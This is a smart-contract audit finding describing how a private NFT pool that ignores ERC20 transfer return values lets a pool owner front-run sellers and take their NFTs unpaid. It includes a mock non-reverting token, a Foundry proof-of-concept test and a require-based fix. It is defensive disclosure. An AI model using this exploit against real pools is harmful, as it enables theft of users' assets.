# Vulnerability details

## Impact
Some tokens return false on fail and don't revert. When a user call sell function to sell a nft, the owner of the pool can frontrun the transaction to withdraw the tokens to receive the user nft without paying tokens.

## Proof of Concept
The owner of the pool doesn't need to pay for any nft with the following steps:
- Pool is created using a token that doesn't revert on failure
- User makes a transaction to sell nft to the pool
- Owner front-run the transaction withdrawing base tokens

For this example, I will use the zrx implementation of transfer.
```
import {ERC20} from "solmate/tokens/ERC20.sol";

contract StandardToken is ERC20 {

    constructor() ERC20("zrx", "zrx", 18) public {

    }
    function transfer(address _to, uint _value) public override returns (bool) {
        //Default assumes totalSupply can't be over max (2^256 - 1).
        if (balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]) {
            balanceOf[msg.sender] -= _value;
            balanceOf[_to] += _value;
            return true;
        } else { return false; }
    }
}
```
I added the following test to the Sell.t.sol file 
```
  function test_StoleNft() public {
        StandardToken zrx = new StandardToken();
        // arrange
        privatePool = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));
        privatePool.initialize(
            address(zrx),
            nft,
            virtualBaseTokenReserves,
            virtualNftReserves,
            changeFee,
            feeRate,
            merkleRoot,
            true,
            false
        );
        factory.setProtocolFeeRate(1000); // 1%
        tokenIds.push(1);
        tokenIds.push(2);
        tokenIds.push(3);
        milady.setApprovalForAll(address(privatePool), true);
        (uint256 netOutputAmount,, uint256 protocolFeeAmount) = privatePool.sellQuote(tokenIds.length * 1e18);

        // adding just the protocolFeeAmount
        deal(address(zrx), address(privatePool),  protocolFeeAmount);
        assertEq(zrx.balanceOf(address(this)), 0);
        assertEq(zrx.balanceOf(address(privatePool)), protocolFeeAmount);

        // act
        privatePool.sell(tokenIds, tokenWeights, proofs, stolenNftProofs);

        // assert
        assertEq(
            zrx.balanceOf(address(factory)), protocolFeeAmount, "Should have transferred protocol fee to factory"
        );
        assertEq(zrx.balanceOf(address(this)), 0, "Should have transferred protocol fee to factory");
    }
```

## Tools Used
Manual review, foundry

## Recommended Mitigation Steps
Add a require statement to check the return of the transfer function.
```
require(ERC20(baseToken).transfer(msg.sender, netOutputAmount), "not enough tokens");
```

# Lines of code

